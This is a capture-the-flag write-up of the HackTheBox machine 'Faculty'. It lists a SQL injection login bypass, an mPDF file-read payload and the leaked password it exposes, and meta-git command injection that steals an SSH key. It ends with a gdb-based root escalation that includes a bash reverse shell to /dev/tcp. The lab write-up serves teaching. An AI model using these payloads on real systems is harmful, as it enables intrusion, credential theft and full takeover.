+++
author = "Khaled Ngm"
title = "Faculty write-up (HackTheBox)"
date = "2022-10-14"
description = ""
+++

# Faculty write-up HackTheBox
![faculty](/images/faculty.png)

### 1. Port Scan Enumuration
### 2. Directory Fuzzing
### 3. Exploitation
### 4. Privilege Escalation
* ### USER
* ### ROOT

## Port Scan (Nmap)
* First We will scan target with nmap ``nmap -sV -sC 10.10.11.169``
* I found two open ports ``ssh`` and ``http``
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-13 15:19 EDT
Nmap scan report for faculty.htb (10.10.11.169)
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: School Faculty Scheduling System
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.91 seconds

```
## Directory Fuzzing 
I started to Fuzz directory using diresearch using
``python3 dirsearch.py -u http://faculty.htb``

I have found these directories .
```
Target: http://faculty.htb/

[15:22:15] Starting: 
[15:22:38] 301 -  178B  - /admin  ->  http://faculty.htb/admin/             
[15:22:39] 302 -   14KB - /admin/  ->  login.php                            
[15:22:39] 302 -   14KB - /admin/?/login  ->  login.php                     
[15:22:39] 200 -    3KB - /admin/home.php                                   
[15:22:39] 200 -   17B  - /admin/download.php                               
[15:22:39] 200 -    5KB - /admin/login.php                                  
[15:22:39] 302 -   14KB - /admin/index.php  ->  login.php                   
[15:23:06] 200 -    3KB - /header.php                                       
[15:23:08] 302 -   12KB - /index.php  ->  login.php                         
[15:23:12] 200 -    5KB - /login.php                                        
[15:23:37] 500 -    0B  - /test.php  
```
## Exploitation
* lets navigate into ``http://faculty.htb/admin/login``
* I tried to inject input with single qoute and I got this error .

 ![admin](/images/admin.png)
* I saved this path as draft ``/var/www/scheduling/admin/admin_class.php ``
* I used this payload to login as admin  ``admin'or 1=1#`` and this was successful .
* After a minuites of checking functions I found **download** button at **Faculty list** that use **MPDF library** that convert html to pdf file .
* After a minutes of enum I found that it's affected with local file inclusion check [here](https://www.exploit-db.com/exploits/50995) .

* I decoded this payload ``<annotation file="/var/www/scheduling/admin/admin_class.php" content=""  icon="Graph" title="Attached File: " pos-x="195" />`` 
   to urlencode then base64 and replaced it with burp proxy and I checkded file content that contain ``db_connect.php``.
* I repeated this step to get db password . 

   ![chef](/images/chef.png)

* pass > Co.met06aci.dly53ro.per

* I also read  ``/etc/passwd`` and I got 2 users 
``` 
gbyolo
developer
```  
* Lets try to connect to gbyolo using ssh ``ssh gbyolo@10.10.11.169`` with ``Co.met06aci.dly53ro.per`` password ... success ! .

## Privilege Escalation (User)

* I used ``sudo -l`` command to see if this user can run any command with high priv .

```
-bash-5.0$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```
* If we take a look , we see that gbyolo can run meta-git as developer and I found [RCE](https://hackerone.com/reports/728040) for meta-git module we can use to esclate our priv .

* lets run module as developer user ``sudo -u developer meta-git clone 'ngm||whoami'`` .
![meta-git](/images/git.png)

* We can now get ssh key that located at ``~/.ssh/id_rsa`` using command ``sudo -u developer meta-git clone 'ngm||cat ~/.ssh/id_rsa'`` , I copied ssh key to ``dev.key`` with permission ``chmod 600 dev.key``.

* I used ``ssh -i dev.key developer@10.10.11.169`` to login ssh .

## Privilege Escalation (Root)

* First I executed [linpeas.sh](https://github.com/topics/linpeas) script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts .
* I have found files belongs to root annd readable by beveloper user .
![linpeas](/images/linpeas.png)
* then I tried to a process that’s run by root and also has the system context  then I found that ``python3`` running with ``pid 710`` .
* I attached process to gdb using ``gdb -p 710`` command .
* Lets call system context and run commands with high privileges .
* You won’t be able to see the output of the command executed but it will be executed by that process (so get a rev shell) using ``call (void)system("bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'")`` or you can give SUID permission to ``/bin/bash`` using ``call (void)system("chmod u+s /bin/bash")`` then ``bash -p`` , now we are root .

# Thanks
